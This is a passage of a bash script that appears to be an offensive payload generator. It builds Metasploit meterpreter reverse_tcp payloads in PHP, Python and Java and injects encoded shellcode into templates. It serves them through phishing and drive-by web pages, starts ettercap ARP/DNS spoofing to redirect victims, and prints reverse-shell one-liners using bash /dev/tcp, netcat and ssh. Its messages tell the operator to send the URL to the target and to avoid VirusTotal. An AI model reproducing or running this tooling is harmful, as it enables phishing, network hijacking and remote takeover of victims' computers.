elif [ "$serv" = "php/meterpreter (base64)" ]; then
# ----------------------
# BASE64 ENCODED PAYLOAD
# ----------------------
echo "[☠ ] Building shellcode -> php language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠ ] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠ ] exec.php -> found!"
      sleep 2
 
   else

      echo "[☠ ] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name.php
cd $IPATH/templates/
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m
chmod +x $IPATH/output/$N4m > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m\n\nCopy webshell to target website and\nvisite the URL to get a meterpreter session\nExample: http://$lhost/$N4m\n\nOr use apache2 attack vector to deliver $N4m\nto target (trigger download)\n\nChose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 350) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠ ] Start a multi-handler..."
     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯ ] Please dont test samples on virus total..."
     xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"

        fi
   fi



else



# ------------------------------
# BASE64 MY UNIX APACHE2 EXPLOIT
# ------------------------------
echo "[☠ ] Building shellcode -> php language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠ ] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠ ] exec.php  -> found!"
      sleep 2
 
   else

      echo "[☠ ] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi


cd $IPATH/templates/
# injecting settings into trigger.sh
echo "[☠ ] building  -> trigger.sh!"
sleep 2
sed "s|InJ3C|$N4m|g" trigger.sh > trigger.raw
sed "s|Lh0St|$lhost|g" trigger.raw > trigger2.raw
mv trigger2.raw $IPATH/output/trigger.sh
chmod +x $IPATH/output/trigger.sh > /dev/null 2>&1
rm trigger.raw > /dev/null 2>&1


# injecting shellcode into name.php
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m
chmod +x $IPATH/output/$N4m > /dev/null 2>&1


# edit files nedded
cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|trigger.sh|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
# copy from output
cd $IPATH/output
cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
cp trigger.sh $ApAcHe/trigger.sh > /dev/null 2>&1
echo "[☠ ] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"

        fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
clear
cd $IPATH/
fi
}





# -----------------------------------------------------------------
# build shellcode in PYTHON (multi OS)
# just because ive liked the python payload from veil i decided
# to make another one to all operative systems (python/meterpreter)
# P.S. python outputs in venom uses (windows/meterpreter) ;)
# -----------------------------------------------------------------
sh_shellcode14 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode.py" --width 300) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> python language..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : python/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/chars.raw"
st0r3=`cat $IPATH/output/chars.raw`
disp=`cat $IPATH/output/chars.raw | awk {'print $3'} | cut -d '(' -f3 | cut -d ')' -f1`

# display shellcode
# cat $IPATH/output/chars.raw
echo ""
echo "[☠ ] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] editing/backup files..."
cp $InJEc9 $IPATH/templates/exec0[bak].py
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc9 ]; then
      echo "[☠ ] exec0.py -> found!"
      sleep 2
 
   else

      echo "[☠ ] exec0.py -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi



# injecting shellcode into name.py
cd $IPATH/templates/
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
echo "[☠ ] Make it executable..."
sleep 2
sed "s|InJEc|$disp|g" exec0.py > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m
chmod +x $IPATH/output/$N4m
cUe=`echo $N4m | cut -d '.' -f1`


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
      sleep 2

   else

      N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING: to use SFX attack vector: $N4m\nneeds to be compressed into one WinRAR/SFX\n\nexample: $cUe.exe" --entry --width 360) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"

        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ------------------------------------------------------
# drive-by attack vector JAVA payload.jar
# i have allways dream about this (drive-by-rce)
# using JAVA (affects all operative systems with python)
# -------------------------------------------------------
sh_shellcode15 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --title="☠ JAR NAME ☠" --text "example: shellcode.jar" --entry --width 330) > /dev/null 2>&1


echo "[☠ ] Building shellcode -> java language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : java/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f java > $IPATH/output/$N4m"
# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] building raw shellcode..."
sleep 2
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠ ] Start a multi-handler..."
     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯ ] Please dont test samples on virus total..."
     xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"

   else

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
      echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"


        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
clear
cd $IPATH/
}






# ---------------------------------------------------------
# WEB_DELIVERY PYTHON/PSH PAYLOADS (msfvenom web_delivery)
# loading from msfconsole the amazing web_delivery module
# writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'
# this as nothing to do with shellcode, but i LOVE this :D
# ---------------------------------------------------------
sh_web_delivery () {
# get user input to build the payload
echo "[☆ ] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
# CHOSE WHAT PAYLOAD TO USE
PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available payloads:" --radiolist --column "Pick" --column "Option" TRUE "python" FALSE "powershell" --width 350 --height 180) > /dev/null 2>&1


   if [ "$PuLK" = "python" ]; then
   echo "[☠ ] Building shellcode -> $PuLK language..."
   sleep 2
   tagett="0"
   filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload.py" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

 shellcode settings
+-------------------------------
| LPORT   : $lport
| URIPATH : /SecPatch
| SRVHOST : $srvhost
| PAYLOAD : python/meterpreter/reverse_tcp
|_STORED  : $IPATH/output/$filename

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] editing/backup files..."
cp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.py ]; then
      echo "[☠ ] web_delivery.py -> found!"
      sleep 2
 
   else

      echo "[☠ ] web_delivery.py -> not found!"
      exit
   fi


# edit/backup files nedded
cd $IPATH/templates/
echo "[☠ ] building -> $filename"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename
mv $filename $IPATH/output/$filename
chmod +x $IPATH/output/$filename

# winrar/sfx trigger
cUe=`echo $filename | cut -d '.' -f1`
N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $filename\nneeds to be compressed into one SFX\n\n1º compress $filename into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1


cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$cUe.exe|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename $ApAcHe/$cUe.exe > /dev/null 2>&1
echo "[☠ ] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"


        else

        echo "- ATTACK VECTOR: http://$srvhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"

        fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
rm $ApAcHe/$cUe.exe > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
# -------------------------------------------------

   else

# -------------------------------------------------
echo "[☠ ] Building shellcode -> $PuLK language..."
sleep 2
tagett="2"
filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload.bat" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| URIPATH : /SecPatch
| SRVHOST : $srvhost
| PAYLOAD : windows/meterpreter/reverse_tcp
|_STORED  : $IPATH/output/$filename

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] editing/backup files..."
cp $IPATH/templates/web_delivery.bat $IPATH/templates/web_delivery[bak].bat


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.bat ]; then
      echo "[☠ ] web_delivery.bat -> found!"
      sleep 2
 
   else

      echo "[☠ ] web_delivery.bat -> not found!"
      exit
      fi


cd $IPATH/templates/
echo "[☠ ] building -> $filename"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.bat > $filename
mv $filename $IPATH/output/$filename
chmod +x $IPATH/output/$filename


cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename $ApAcHe/$filename > /dev/null 2>&1
echo "[☠ ] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"


        else

        echo "- ATTACK VECTOR: http://$srvhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"

        fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
rm $ApAcHe/$filename > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
fi
}








# -----------------------------
# INTERACTIVE SHELLS (build-in) 
# ----------------------------- 
sh_buildin () {

# get user input to build the payload
echo "[☆ ] Enter shell settings!"
echo "[☆ ] Credits: Arr0way!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1


# CHOSE WHAT PAYLOAD TO USE
InSh3ll=$(zenity --list --title "☆ SYSTEM BUILD-IN SHELLS ☆" --text "\nThis module uses system build-in tools sutch\nas bash,netcat,ssh and use them to spaw a\ntcp connection (reverse or bind shell).\n\nAvailable shells:" --radiolist --column "Pick" --column "Option" TRUE "simple bash shell" FALSE "simple reverse bash shell" FALSE "simple reverse netcat shell" FALSE "simple ssh shell" FALSE "simple reverse python shell" FALSE "simple php shell" --width 350 --height 350) > /dev/null 2>&1


   # build-in systems shells
   if [ "$InSh3ll" = "simple bash shell" ]; then
     echo "[✔ ] Building -> simple bash shell..."
     echo "---"
     echo "- simple bash shell that uses bash dev/tcp"
     echo "- socket programming to build a conection over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- EXECUTE : sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- NETCAT  : sudo nc -l -v $lport"
     echo "---"
     sleep 3
     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple reverse bash shell" ]; then
     echo "[✔ ] Building -> simple reverse bash shell..."
     echo "---"
     echo "- simple reverse bash shell uses sh dev/tcp"
     echo "- socket programming to build a reverse shell"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- EXECUTE : sudo 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- NETCAT  : sudo nc -l -v $lhost $lport"
     echo "---"
     sleep 3
     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost $lport"
     sleep 2
 


   elif [ "$InSh3ll" = "simple reverse netcat shell" ]; then
     echo "[✔ ] Building -> simple reverse netcat shell..."
     echo "---"
     echo "- simple Netcat reverse shell using bash"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : /bin/sh | nc $lhost $lport"
     echo "- EXECUTE : sudo /bin/sh | nc $lhost $lport"
     echo "- NETCAT  : sudo nc -l -v $lhost $lport"
     echo "---"
     sleep 3
     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple ssh shell" ]; then
     echo "[✔ ] Building -> simple ssh shell..."
     echo "---"
     echo "- Reverse connect using an SSH tunnel"
     echo "- Use The ssh client to forward a local port"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- EXECUTE : sudo ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- NETCAT  : sudo nc -l -v 127.0.0.1 $lport"
     echo "---"
     sleep 3
     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 $lport"
     sleep 2


   elif [ "$InSh3ll" = "simple reverse python shell" ]; then
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.py" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m > /dev/null 2>&1

     echo "[✔ ] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python"
     echo "- template to forward tcp connections.."
